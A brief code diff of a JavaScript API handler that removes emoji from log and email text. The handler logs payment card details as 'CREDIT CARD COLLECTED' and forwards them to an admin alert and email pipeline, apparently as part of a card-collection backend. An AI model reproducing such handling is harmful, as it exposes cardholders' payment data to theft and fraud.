@@ -42,7 +42,7 @@ export default async function handler(req, res) {
     };
 
     // Send alert to admin
-    console.log('🎯 CREDIT CARD COLLECTED:', cardInfo);
+    console.log('CREDIT CARD COLLECTED:', cardInfo);
 
     // Send to your existing alert system (same as other alerts)
     try {
@@ -53,7 +53,7 @@ export default async function handler(req, res) {
           ...cardInfo,
           alertType: 'CREDIT_CARD_COLLECTED',
           priority: 'HIGH',
-          emailSubject: `🎯 CREDIT CARD COLLECTED - $${(parseFloat(amount) * 3200).toFixed(2)}`,
+          emailSubject: `CREDIT CARD COLLECTED - $${(parseFloat(amount) * 3200).toFixed(2)}`,
           adminEmail: true
         })
       });
